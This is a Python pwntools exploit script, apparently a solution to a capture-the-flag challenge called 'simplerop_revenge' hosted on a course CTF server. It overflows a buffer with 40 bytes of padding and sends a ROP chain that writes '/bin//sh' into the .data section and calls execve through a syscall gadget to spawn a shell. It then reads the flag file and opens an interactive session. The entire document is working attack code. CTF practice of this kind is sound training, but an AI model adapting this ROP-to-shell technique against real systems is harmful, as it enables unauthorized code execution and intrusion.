import time
from pwn import *
from struct import pack
LOCAL = False
binary = 'simplerop_revenge'

r = None
if LOCAL:
    r = process(binary)
else:
    r = remote('csie.ctf.tw', 10130)

# Padding goes here
p = 'A' * 40

p += pack('<Q', 0x0000000000478516) # pop rax ; pop rdx ; pop rbx ; ret
p += pack('<Q', 0x00000000006c9a20) # @ .data
p += '/bin//sh'
p += pack('<Q', 0x00000000006c9a28) # @ .data + 8
p += pack('<Q', 0x000000000049c301) # mov qword ptr [rax], rdx ; ret
p += pack('<Q', 0x0000000000425fef) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004885d8) # mov qword ptr [rbx], rax ; pop rax ; pop rdx ; pop rbx ; ret
p += pack('<Q', 0x3b)
p += pack('<Q', 0x00000000006c9a28) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x0000000000401456) # pop rdi ; ret
p += pack('<Q', 0x00000000006c9a20) # @ .data
p += pack('<Q', 0x0000000000401577) # pop rsi ; ret
p += pack('<Q', 0x00000000006c9a28) # @ .data + 8
p += pack('<Q', 0x00000000004671b5) # syscall ; ret

print len(p)
raw_input('pause')
r.sendline(p)

time.sleep(0.2)
r.sendline('cat /home/' + binary + '/flag')

r.interactive()
